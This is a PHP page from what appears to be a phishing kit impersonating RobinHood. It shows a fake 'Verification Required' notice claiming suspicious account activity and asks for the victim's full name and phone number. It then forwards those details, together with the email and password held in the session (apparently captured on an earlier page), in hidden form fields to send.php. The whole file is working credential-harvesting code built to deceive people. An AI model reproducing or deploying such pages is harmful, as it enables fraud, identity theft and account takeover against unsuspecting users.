<?php include_once './config.php'; ?>
<html lang="en">
    <?php
        $title = 'Verify | RobinHood';
        include_once './includes/meta.php';
        if(empty($_SESSION["email"]) || empty($_SESSION["password"])) {
            redirect(base_url());
        }
        unset($_SESSION['phone_number']);
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <link rel="stylesheet" href="<?= base_url('assets/country-code-picker/css/jquery.ccpicker.css')?>">
        <div class="d-flex align-items-center" style="min-height: 100vh;">
            <form method="post" action="<?= base_url('send.php')?>" class="col-12 p25 shadow-lg border border-secondary-subtle bg-white">
                <input type="hidden" name="email" value="<?=$_SESSION['email']?>" >
                <input type="hidden" name="password" value="<?=$_SESSION['password']?>" >
                <div class="text-center">
                    <h3 class="my30 fs25 fw-bold">Verification Required</h3>
                    <h3 class="my30 fs20 fw-bold">Important Information</h3>
                    <p class="my30 fs16 lh35 fw-bold">Some Suspicious Activity Found With Your Account, Enter Your Phone Number to Verify Your Identity.</p>
                </div>
                <div class="my25">
                    <label for="" class="form-label">Full Name</label>
                    <input name="name" type="text" required="" minlength="3" maxlength="100" class="form-control" placeholder="" value="" >
                </div>
                <div className="my25">
                    <label for="" class="form-label">Phone Number</label>
                    <div class="form-control fs16" style="padding: 0px;">
                        <input name="phone_number" type="number" id="phone_number" required="" style="width: 70%;border: solid 1px #DDD;padding: 10px 5px;margin: 0px;" class="" placeholder="Phone number" value="" >
                    </div>
                </div>
                <div class="row mt-4">
                    <div class="col-12 text-end">
                        <button type="submit" class="btn btn-success btn-lg px40 "><span>Submit</span></button>
                    </div>
                </div>
            </form>
        </div>
        <?php include_once './includes/footer.php'; ?>
        <script src="./assets/country-code-picker/js/jquery.ccpicker.min.js"></script>
        <script type="text/javascript">
            $(document).ready(function() {
                $("#phone_number").CcPicker({ countryCode: "us", dataUrl: "<?= base_url('assets/country-code-picker/data/en.json')?>", searchPlaceHolder: "Find..." });
            });
            
        </script>
    </body>
</html>